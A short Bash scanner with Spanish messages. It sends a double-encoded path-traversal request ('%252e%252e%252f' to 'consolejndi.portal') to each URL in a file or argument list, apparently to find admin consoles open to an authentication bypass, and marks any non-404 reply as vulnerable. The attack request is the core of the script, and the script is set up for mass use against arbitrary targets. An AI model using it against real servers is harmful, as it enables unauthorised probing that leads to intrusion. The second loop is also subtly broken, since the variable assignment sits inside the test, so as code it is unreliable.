#!/bin/bash

function ctrl_c(){
	echo -e "\n[!] Saliendo. . .\n"
	exit 1

}
trap ctrl_c INT

if [[ -z "$@" ]]; then
	echo "Los argumentos deben ser un archivo con la(s) url(s) a probar"
	exit 1
fi

objetivos="$1"

####################		colores		####################
normal="\033[0;37m"		#blanco
error="\033[0;31m"		#rojo


if [[ -r $objetivos ]]; then
	for url in $(cat $objetivos); do
		if [[ $(curl -k -s -o /dev/null -w '%{response_code}' "$url/console/css/%252e%252e%252f/consolejndi.portal" &) -ne 404 ]]; then
			echo -e "[${error}!${normal}] $url -> ${error}VULNERABLE${normal}"
		fi; wait
	done
else
	for url in $objetivos; do
		if [[ codigo=$(curl -k -s -o /dev/null -w '%{response_code}' "$url/console/css/%252e%252e%252f/consolejndi.portal" &) -ne 404 ]]; then
			echo -e "[${error}!${normal}] $url($codigo) -> ${error}VULNERABLE${normal}"
		fi; wait
	done
fi
